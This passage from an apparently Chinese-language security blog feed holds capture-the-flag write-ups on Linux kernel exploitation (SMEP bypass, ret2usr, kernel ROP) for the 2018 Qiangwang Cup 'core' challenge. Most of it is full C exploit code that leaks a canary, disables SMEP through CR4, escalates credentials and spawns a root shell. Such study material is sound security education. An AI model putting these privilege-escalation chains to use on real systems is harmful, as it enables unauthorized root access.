grep smep /proc/cpuinfo</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov patp</span><br><span class="line">/ $ grep smap /proc/cpuinfo</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov patp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> + bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  save_status();</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81075014: mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias;<span class="comment">//pop rdi; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81075014</span> + bias;<span class="comment">//mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)getRootPrivilige;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span> + bias; <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/16/kernel-bypass-smep/image-20230816215642698.png" alt="image-20230816215642698"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Ret2usr</title>
      <link href="/2023/08/16/kernel-ret2usr/"/>
      <url>/2023/08/16/kernel-ret2usr/</url>
      
        <content type="html"><![CDATA[<p>对于没开 <strong>SMAP&#x2F;SMEP</strong>或者可以修改cr4寄存器20，21位的内核，可以使用ret2usr，此时内核可以访问&#x2F;执行用户态的代码，所以只需要提前在用户态准备好提权函数，想办法让内核去执行</p><p>KPTI 的出现ret2usr成为过去式了</p><h2 id="2018-强网杯-core"><a href="#2018-强网杯-core" class="headerlink" title="2018 强网杯 - core"></a>2018 强网杯 - core</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  save_status();</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)getRootPrivilige;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/16/kernel-ret2usr/image-20230816203017727.png" alt="image-20230816203017727"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Rop</title>
      <link href="/2023/08/14/kernel-rop/"/>
      <url>/2023/08/14/kernel-rop/</url>
      
        <content type="html"><![CDATA[<h2 id="进程描述符（process-descriptor）"><a href="#进程描述符（process-descriptor）" class="headerlink" title="进程描述符（process descriptor）"></a>进程描述符（process descriptor）</h2><p>在内核中使用结构体 <code>task_struct</code> 表示一个进程,结构体定义于内核源码<a href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/sched.h#L629">include&#x2F;linux&#x2F;sched.h</a></p><p>task_struct结构体中的权限管理部分</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>        *<span class="title">cred</span>;</span></span><br></pre></td></tr></table></figure><p><strong>Process credentials</strong> 是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 <code>cred</code> 结构体进行标识，对于一个进程而言应当有三个 cred：</p><ul><li><strong>ptracer_cred：</strong>使用<code>ptrace</code>系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）</li><li><strong>real_cred：</strong>即<strong>客体凭证</strong>（<strong>objective cred</strong>），通常是一个进程最初启动时所具有的权限</li><li><strong>cred：</strong>即<strong>主体凭证</strong>（<strong>subjective cred</strong>），该进程的有效cred，kernel以此作为进程权限的凭证</li></ul><p>cred结构体在<a href="https://elixir.bootlin.com/linux/v5.5-rc2/source/include/linux/cred.h#L111">include&#x2F;linux&#x2F;cred.h</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *    task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *    upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task&#x27;s actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage; 原子计数器，用于跟踪对该安全上下文结构的引用数量</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span> 任务的实际用户标识</span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span> 任务的实际组标识（real group ID）</span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span> 任务的保存用户标识（saved user ID），在权限切换时可能用到。</span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span> 任务的保存组标识（saved group ID），在权限切换时可能用到。</span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span> 任务的有效用户标识（effective user ID），用于权限检查和访问控制。</span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span> 任务的有效组标识（effective group ID），用于权限检查和访问控制。</span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span> 用于虚拟文件系统（VFS）操作的文件系统用户标识（filesystem user ID）</span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span> 用于虚拟文件系统（VFS）操作的文件系统组标识（filesystem group ID</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以直接把uid–&gt;fsgid 都修改为 0获得root权限</p><p>或者了利用rop执行<code>commit_creds(prepare_kernel_cred(NULL))</code>获得root权限</p><p>自从内核版本 <strong>6.2</strong> 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，只能<code>commit_creds(&amp;init_cred)</code></p><blockquote><p><code>init_cred</code>是<code>init</code> 进程的 <code>cred</code> ，因此其权限为root ,泄露出内核基址之后,如果保护开的不牛x，我们也便能够获得 <code>init_cred</code> 的地址</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> cred* <span class="title function_">prepare_kernel_cred</span><span class="params">(<span class="keyword">struct</span> task_struct* daemon)</span></span><br><span class="line">该函数用以拷贝一个进程daemon的cred结构体，并返回一个新的cred结构体</span><br><span class="line"><span class="type">int</span> <span class="title function_">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *new)</span></span><br><span class="line">该函数用以将一个新的cred结构体应用到进程</span><br></pre></td></tr></table></figure><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>主要是在内核栈栈溢出，rop执行特权函数提权后，返回用户态，再起一个shell就可以继承root权限，所以我们返回前要把栈伪造成正常进入内核提权时的栈</p><p><img src="/2023/08/14/kernel-rop/image-20230816162903167.png" alt="image-20230816162903167"></p><p>保存好用户栈的板子</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//-masm=intel</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span 